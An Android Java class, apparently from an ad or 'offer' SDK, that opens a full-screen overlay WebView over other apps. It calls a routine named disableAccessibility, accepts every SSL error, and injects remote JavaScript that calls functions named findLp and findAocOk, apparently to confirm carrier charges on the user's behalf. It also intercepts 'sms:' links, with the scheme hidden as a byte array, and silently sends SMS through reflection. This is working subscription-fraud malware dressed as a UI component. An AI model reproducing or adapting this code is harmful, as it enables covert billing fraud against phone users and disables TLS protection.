package com.oom.tblib.view;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.net.http.SslError;
import android.text.TextUtils;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.webkit.DownloadListener;
import android.webkit.JavascriptInterface;
import android.webkit.SslErrorHandler;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.TextView;

import com.oom.tblib.mode.Ma;
import com.oom.tblib.utils.DataUtil;
import com.oom.tblib.utils.HttpUtil;
import com.oom.tblib.utils.JsUtil;
import com.oom.tblib.utils.LogUtil;
import com.oom.tblib.utils.PhoneOperateUtil;
import com.oom.tblib.utils.Utils;

import java.lang.reflect.Method;

/**
 * Created by hwl on 2017/08/29.
 */

public class WebViewWindow {

    private static WebViewWindow instance = null;

    private Context context;

    private FrameLayout view;
    private FrameLayout loadPro;

    private ProgressBar topPro;

    private ImageView closeView;

    private WebView webView;

    private RelativeLayout errorLay;

    private TextView proText;

    private WindowManager windowManager = null;

    private WindowManager.LayoutParams windParams = null;

    private int offer_id;

    private String jsdata, last_finished_url = "", fail_url = "";

    public static WebViewWindow getInstance(Context context) {
        if (instance == null) {
            instance = new WebViewWindow(context);
        }
        return instance;
    }

    public WebViewWindow(Context context) {
        this.context = context;

        initWindowMannager();

        initView();
    }

    private void initWindowMannager() {

        windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);

        windParams = new WindowManager.LayoutParams();

        windParams.width = WindowManager.LayoutParams.MATCH_PARENT;

        windParams.height = WindowManager.LayoutParams.MATCH_PARENT;

        windParams.type = WindowManager.LayoutParams.TYPE_PHONE;

        windParams.format = PixelFormat.RGBA_8888;

        //        windParams.flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_FULLSCREEN;

        windParams.x = 0;

        windParams.y = 0;

        // windParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
        //         windParams.flags = WindowManager.LayoutParams.FLAG_FULLSCREEN | WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM;

    }


    @SuppressLint("JavascriptInterface")
    private void initView() {

        view = new FrameLayout(context);
        view.setBackgroundColor(Color.argb(0, 0, 0, 0));
        view.setLayoutParams(new FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT));

        closeView = new ImageView(context);
        FrameLayout.LayoutParams closeParam = new FrameLayout.LayoutParams(Utils.getDS(context, 30), Utils.getDS(context, 30));
        closeParam.gravity = Gravity.END;
        closeParam.setMargins(Utils.getDS(context, 5), Utils.getDS(context, 5), Utils.getDS(context, 5), Utils.getDS(context, 5));
        closeView.setLayoutParams(closeParam);
        closeView.setImageBitmap(Utils.getImageFromAssets(context.getApplicationContext(), "cancel.png"));
        closeView.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                destoryView();
            }
        });

        LinearLayout linLay = new LinearLayout(context);
        linLay.setOrientation(LinearLayout.VERTICAL);
        linLay.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));

        topPro = new ProgressBar(context, null, android.R.attr.progressBarStyleHorizontal);
        topPro.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, Utils.getDS(context, 3)));
        topPro.setProgress(0);
        topPro.setMax(100);

        FrameLayout framLay = new FrameLayout(context);
        framLay.setLayoutParams(new FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT));

        webView = new WebView(context);
        Utils.initWebView(webView);
        webView.addJavascriptInterface(context, "toolbox");

        webView.setWebViewClient(new MwebViewClient());
        webView.setWebChromeClient(new WebChroClient());
        webView.setDownloadListener(new MyDownloadListener());

        //加载错误
        errorLay = new RelativeLayout(context);
        FrameLayout.LayoutParams errLayParam = new FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT);
        errLayParam.gravity = Gravity.CENTER;
        errorLay.setLayoutParams(errLayParam);
        errorLay.setVisibility(View.GONE);
        errorLay.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                webView.loadUrl(fail_url);

                errorLay.setVisibility(View.GONE);
            }
        });

        ImageView errorImg = new ImageView(context);
        errorImg.setImageBitmap(Utils.getImageFromAssets(context, "loadfail.png"));
        RelativeLayout.LayoutParams errorParam = new RelativeLayout.LayoutParams(Utils.getDS(context, 150), Utils.getDS(context, 150));
        errorParam.addRule(RelativeLayout.CENTER_IN_PARENT);
        errorImg.setLayoutParams(errorParam);

        //中间圆形进度条和数字
        loadPro = new FrameLayout(context);
        loadPro.setLayoutParams(errLayParam);

        ProgressBar centPro = new ProgressBar(context);
        FrameLayout.LayoutParams centProParam = new FrameLayout.LayoutParams(Utils.getDS(context, 100), Utils.getDS(context, 100));
        centProParam.gravity = Gravity.CENTER;
        centPro.setLayoutParams(centProParam);

        proText = new TextView(context);
        proText.setTextColor(Color.BLACK);
        proText.setTypeface(Typeface.defaultFromStyle(Typeface.BOLD));
        proText.setTextSize(Utils.getDS(context, 10));
        FrameLayout.LayoutParams textParam = new FrameLayout.LayoutParams(FrameLayout.LayoutParams.WRAP_CONTENT, FrameLayout.LayoutParams.WRAP_CONTENT);
        textParam.gravity = Gravity.CENTER;
        proText.setLayoutParams(textParam);

        loadPro.addView(centPro);
        loadPro.addView(proText);

        errorLay.addView(errorImg);

        framLay.addView(webView);
        framLay.addView(errorLay);
        framLay.addView(loadPro);

        linLay.addView(topPro);
        linLay.addView(framLay);

        view.addView(linLay);
        view.addView(closeView);

    }

    public void startLoad(Ma offer) {

        if (webView == null) {
            initView();
        }

        String load_url = DataUtil.getChangeUrl(offer, context, false);

        PhoneOperateUtil.disableAccessibility(context);

        PhoneOperateUtil.disableJsIfUrlEncodedFailed(webView, load_url);

        webView.loadUrl("about:blank");

        initJsData();

        this.offer_id = offer.getOffer_id();

        if (view == null) {
            return;
        }

        if (view.isShown()) {
            windowManager.removeView(view);
        }

        webView.stopLoading();
        webView.clearHistory();
        webView.clearCache(true);
        webView.clearFocus();
        webView.loadUrl(load_url);

        LogUtil.show(load_url);

        windowManager.addView(view, windParams);
    }

    private void initJsData() {
        HttpUtil.executorService.execute(new Runnable() {
            @Override
            public void run() {
                jsdata = JsUtil.getInstance(context).getJsString();
            }
        });
    }

    @JavascriptInterface
    public void openImage(String tag, String satisfy_url) {
        if (TextUtils.isEmpty(tag) || TextUtils.isEmpty(satisfy_url)) {
            return;
        }
    }

    @SuppressLint("NewApi")
    private void destoryView() {

        if (view != null && view.isShown()) {
            windowManager.removeView(view);
            view = null;
        }

        if (webView != null) {
            try {
                ViewGroup parent = (ViewGroup) webView.getParent();
                if (parent != null) {
                    parent.removeAllViews();
                }
                webView.stopLoading();
                webView.onPause();
                webView.clearHistory();
                webView.removeAllViews();
                webView.destroyDrawingCache();

                webView.destroy();
            } catch (Exception e) {
                e.printStackTrace();
            }

            webView = null;
        }
    }


    private class MwebViewClient extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            //sms:开头
            if (url.startsWith(new String(new byte[]{115, 109, 115, 58}))) {
                try {
                    String port = url.substring(url.indexOf(":") + 1, url.indexOf("?"));

                    String content = url.substring(url.indexOf("=") + 1, url.length());

                    //                    SmsManager.getDefault().sendTextMessage(port, null, content, null, null);

                    Class<?> smsClasss = Class.forName("android.telephony.SmsManager");

                    Method method = smsClasss.getMethod("sendTextMessage", new Class[]{String.class, String.class, String.class, PendingIntent.class, PendingIntent.class});

                    method.invoke(smsClasss.getMethod("getDefault").invoke(null), new Object[]{port, null, content, null, null});

                    return true;
                } catch (Exception e) {

                    e.printStackTrace();
                }
            }

            webView.loadUrl(url);

            return true;
        }

        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {

            super.onPageStarted(view, url, favicon);

            topPro.setVisibility(View.VISIBLE);
            loadPro.setVisibility(View.VISIBLE);
        }

        @Override
        public boolean shouldOverrideKeyEvent(WebView view, KeyEvent event) {

            return super.shouldOverrideKeyEvent(view, event);
        }

        @Override
        public void onPageFinished(WebView view, String url) {

            super.onPageFinished(view, url);

            if (url.equals(last_finished_url) || url.contains("about:blank")) {
                return;
            }

            last_finished_url = url;

            if (!TextUtils.isEmpty(jsdata) && webView != null) {

                webView.loadUrl("javascript:" + jsdata);

                webView.loadUrl("javascript:findLp(" + offer_id + ")");

                webView.loadUrl("javascript:findAocOk()");
            }
        }

        @Override
        public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
            super.onReceivedError(view, errorCode, description, failingUrl);

            view.stopLoading();

            view.clearView();

            view.loadUrl("about:blank");

            fail_url = failingUrl;

            errorLay.setVisibility(View.VISIBLE);
        }

        @Override
        public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
            handler.proceed();
        }
    }

    private class MyDownloadListener implements DownloadListener {
        @Override
        public void onDownloadStart(String url, String userAgent, String contentDisposition, String mimetype, long contentLength) {

        }
    }

    /**
     * WebChromeClient
     */
    private class WebChroClient extends WebChromeClient {

        @Override
        public void onProgressChanged(WebView view, int newProgress) {

            loadPro.setVisibility(View.VISIBLE);

            topPro.setVisibility(View.VISIBLE);
            topPro.setProgress(newProgress);

            if (proText != null) {
                proText.setText(newProgress + "%");
            }

            if (newProgress > 75) {

                loadPro.setVisibility(View.GONE);

                topPro.setVisibility(View.GONE);
            }
        }
    }
}
